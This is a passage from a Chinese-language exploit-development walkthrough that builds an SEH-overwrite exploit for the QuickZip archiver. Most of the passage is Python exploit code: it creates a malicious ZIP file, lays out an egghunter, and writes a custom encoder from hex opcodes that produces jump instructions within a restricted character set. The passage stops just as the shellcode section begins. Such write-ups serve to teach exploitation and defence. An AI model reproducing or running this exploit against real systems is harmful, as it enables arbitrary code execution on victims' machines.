l2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev&quot;
+payload&nbsp;+=&nbsp;&quot;.txt&quot;
+print&nbsp;&quot;[+]&nbsp;Length&nbsp;=&nbsp;&quot;&nbsp;+&nbsp;str(len(payload))
+exploit&nbsp;=&nbsp;header_1&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_2&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_3
+mefile&nbsp;=&nbsp;open(&#39;cst.zip&#39;,&#39;w&#39;);
+mefile.write(exploit);
+mefile.close()
+print&nbsp;&quot;[+]&nbsp;Exploit&nbsp;complete!&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">执行之后：&nbsp;</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01e1a083770a76aecb.png" title="t0198a681327d8aeb4c.png" alt="http://p9.qhimg.com/t0198a681327d8aeb4c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">太棒了，我们已经成功地利用有效字符编写出了想要的代码！ 现在只需跳回到该区域来执行就好了。 我们还需要将我们写入的临时0xDEADBEEF地址更改为实际的偏移量，前提是我们知道它是什么...但现在为时过早。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">跳转</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">不幸的是，我们没有太多的空间可用于跳转：在我们的编码器代码之后只有5个字节，编码器代码之前是4个字节。所以，我们需要找到相应的指令，让我们跳转到刚写的代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">事实证明，由于字符限制，实际上我们无法做太多的事情。 任何短的向后跳转指令都包含无效的字符，无法跳转至恰当的地方。所以，应该考虑是否重用之前用过的跳转。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面来看看我们目前拥有的有效载荷。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01e1a083770a76aecb.png" title="t0198a681327d8aeb4c.png" alt="http://p9.qhimg.com/t0198a681327d8aeb4c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们需要发挥创造性。让我们重用SEH中的JNO跳转，以便再次回到我们控制的内存区域。我们可以在当前编码器有效载荷的开头部分添加一些NOP，然后通过自定义编码器用其他跳转指令将其覆盖，以将我们跳转到刚编写的代码之前。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">哎，这样行得通吗？让我解释一下。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们需要使用的跳转指令本来可以是简单的JMP $ -16（\ xeb \ xee），不幸的是它包含了无效的字符，因此不适用于我们...。但是，任何带有有效的字符的跳转指令都会让我们离的太远。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然而！我们可以使用自定义的编码器来处理它们，就像我们将egghunter的地址放置到EAX一样，只需要调整偏移量并修改代码即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，添加我们的JMP指令。然后，修改我们的原始堆栈，使SEH跳转能够准确到达我们的初始位置。最后，在编码器的开头部分添加一些NOP，它们之后将被所覆盖。下面我们具体介绍其工作原理。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里，让我们先从自定义的编码器前面的NOP开始。 由于我们要求使用有效的字符集，因此可以使用\ x41 \ x41（INC ECX）作为NOP。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来，进行堆栈调整。 从目前的状态来看，我们需要进一步偏移6个字节，以便写入到要覆盖的区域。为此，我们可以进行相应的调整。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后，我们需要用编码器写入JNZ $ -16（\ x75 \ xee）指令。 让我们用新的指令来替换最后两个\ x90（记住这里使用的是little - endianness，所以我们需要反过来写入）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后，代码将变成这样：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#...snip...
+nseh_offset&nbsp;=&nbsp;292
+jump_offset&nbsp;=&nbsp;92
+#...snip...
+payload&nbsp;=&nbsp;egghunter
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(nseh_offset&nbsp;-&nbsp;len(payload)&nbsp;-&nbsp;jump_offset)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;padding&nbsp;for&nbsp;nSEH
+payload&nbsp;+=&nbsp;&quot;\x41\x41&quot;&nbsp;&nbsp;&nbsp;#&nbsp;INC&nbsp;ECX&nbsp;(acts&nbsp;as&nbsp;NOPs,&nbsp;but&nbsp;using&nbsp;valid&nbsp;character&nbsp;set)
+#&nbsp;Offset&nbsp;the&nbsp;stack&nbsp;by&nbsp;0x632&nbsp;to&nbsp;start&nbsp;writing&nbsp;to&nbsp;a&nbsp;controlled&nbsp;area&nbsp;of&nbsp;memory
+#
+payload&nbsp;+=&nbsp;&quot;\x54&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;esp;
+payload&nbsp;+=&nbsp;&quot;\x58&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;eax;
+payload&nbsp;+=&nbsp;&quot;\x05\x33\x07\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x01010733
+payload&nbsp;+=&nbsp;&quot;\x2d\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;sub&nbsp;eax,&nbsp;0x01010101
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+payload&nbsp;+=&nbsp;&quot;\x5c&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;esp;
+#&nbsp;Write&nbsp;instructions&nbsp;for:&nbsp;push&nbsp;esp;&nbsp;pop&nbsp;eax;&nbsp;sub&nbsp;eax,&nbsp;0xDEADBEEF;&nbsp;jmp&nbsp;eax;&nbsp;jnz&nbsp;0xee
+#
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0xee7590e0&nbsp;into&nbsp;EAX&nbsp;&nbsp;==&gt;&gt;&nbsp;&#39;0xee75&#39;&nbsp;represents&nbsp;&#39;JNZ&nbsp;$-16&#39;&nbsp;instruction
+payload&nbsp;+=&nbsp;&quot;\x05\x70\x70\x74\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77747070
+payload&nbsp;+=&nbsp;&quot;\x05\x70\x20\x01\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77012070
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0xffdeadbe&nbsp;into&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x05\x77\x77\x77\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77777777
+payload&nbsp;+=&nbsp;&quot;\x05\x37\x25\x57\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77572537
+payload&nbsp;+=&nbsp;&quot;\x05\x10\x11\x10\x11&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x11101110
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0xef2d5854&nbsp;into&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x05\x43\x47\x1c\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x771c4743
+payload&nbsp;+=&nbsp;&quot;\x05\x10\x10\x01\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77011010
+payload&nbsp;+=&nbsp;&quot;\x05\x01\x01\x10\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x01100101
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(nseh_offset&nbsp;-&nbsp;len(payload))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;padding&nbsp;for&nbsp;the&nbsp;rest&nbsp;of&nbsp;the&nbsp;encoder
+payload&nbsp;+=&nbsp;&quot;\x71\x9b\x70\x9b&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;nSEH:&nbsp;jno&nbsp;$-99;&nbsp;jo&nbsp;$-99&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&#39;9b&#39;&nbsp;will&nbsp;actually&nbsp;be&nbsp;converted&nbsp;to&nbsp;&#39;a2&#39;,&nbsp;which&nbsp;is&nbsp;$-92
+payload&nbsp;+=&nbsp;&quot;\x33\x28\x42\x00&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;SEH
+#...snip...</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">一旦执行，会发生以下情况：</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">崩溃被触发</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">POP-POP-RET指令被调用</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">获得JNO $ -92的跳转地址</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">从头开始执行自定义编码器</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">代码最终将到达第3步中跳转的JNO指令</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">再次取得JNO的跳转地址，但这次，我们登陆的第一条指令是刚刚写入的16个字节的跳转指令</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">获取跳转指令的跳转地址</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用自定义编码器写入要执行的指令&nbsp;</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们来看看到底发生了什么。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行自定义的编码器后：</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t0147f175935f11d34f.png" title="t011b442ae143172a97.png" alt="http://p8.qhimg.com/t011b442ae143172a97.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">取得JMP的跳转地址</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01d7d8180d340906e0.png" title="t01253bd253f99fb030.png" alt="http://p4.qhimg.com/t01253bd253f99fb030.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在写入指令之前登陆，准备执行</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t010e13d6d97675c8ca.png" title="t01b58aa390628035ac.png" alt="http://p2.qhimg.com/t01b58aa390628035ac.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">真棒，正是我们期待的！ 现在我们只需要弄清楚用什么值替代0xDEADBEEF就可以了！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们来计算一下——ESP的当前值是0x0018FB4E，而egghunter代码从0x0018FA90开始，这意味着我们需要将EAX减去0xBE，让EAX指向我们的目的地。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们开始修改漏洞利用代码，这里不是从EAX中减去0xDEADBEEF，而是减去0xBE。 PoC应进行以下修改：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0xff000000&nbsp;into&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x05\x01\x01\x01\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77010101
+payload&nbsp;+=&nbsp;&quot;\x05\x01\x01\x01\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77010101
+payload&nbsp;+=&nbsp;&quot;\x05\x10\x10\x10\x22&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x22101010
+payload&nbsp;+=&nbsp;&quot;\x2d\x12\x12\x12\x11&quot;&nbsp;&nbsp;&nbsp;#&nbsp;sub&nbsp;eax,&nbsp;0x11121212
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0xbe2d5854&nbsp;into&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x05\x43\x47\x1c\x67&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x671c4743
+payload&nbsp;+=&nbsp;&quot;\x05\x11\x11\x11\x57&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x57111111
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">让我们来看看它会把我们带到哪里去。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t019d6ed0a284de4c61.png" title="t017613ee4f076d3c3c.png" alt="http://p4.qhimg.com/t017613ee4f076d3c3c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">真棒！我们跳转到了eghunter。现在，可以轻松插入选择的shellcode，并让egghunter找到它了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们来运行！mona findmsp，以防止我们的有效载荷仍然在内存中...</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t016798390746ec1b50.png" title="t01bc59b8511ca55b96.png" alt="http://p6.qhimg.com/t01bc59b8511ca55b96.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">什么？！它消失了！去哪儿了？发生了什么？那些工作都白做了吗???</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Ok，我知道咋回事。我们在自定义编码例程的开头部分添加的指令损坏了有效载荷，并导致我们的shellcode消失。出问题的指令是POP ESP（\ x5c）——从前的同一个字节会让我们的文件名被解释为一个目录！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我花了很多时间思考、调试，并试图找出一个不会损坏有效载荷的替代方案，但没有成功。在使用有效字符集的情况下，事情根本没那么简单。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是，还是有一个解决方案！也许不是很理想，但毕竟有办法了。看看我们的漏洞利用代码中的下面一行：&nbsp;</span></p><pre class="brush:plain;toolbar:false">exploit&nbsp;=&nbsp;header_1&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_2&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_3</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果在header_3之后再次添加有效载荷，如何？ 这基本上就是在ZIP文件的末尾附加一些垃圾，但它仍然可以工作。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">将该行做如下修改，并用QuickZip打开它。&nbsp;</span></p><pre class="brush:plain;toolbar:false">exploit&nbsp;=&nbsp;header_1&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_2&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_3&nbsp;+&nbsp;payload</pre><p style="text-align:center"><img src="http://p7.qhimg.com/t0182ece007023f1f7f.png" title="t0182ece007023f1f7f.png" alt="http://p7.qhimg.com/t0182ece007023f1f7f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">有一个警告指出在文件末尾有一些垃圾，但没关系，因为仍然可以成功打开该文件。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们触发崩溃，看看这一次我们是否可以在内存中找到这个模版。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t015c1094209ed055db.png" title="t015c1094209ed055db.png" alt="http://p5.qhimg.com/t015c1094209ed055db.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我的天哪，它就在那里！！！&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Shellcode</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 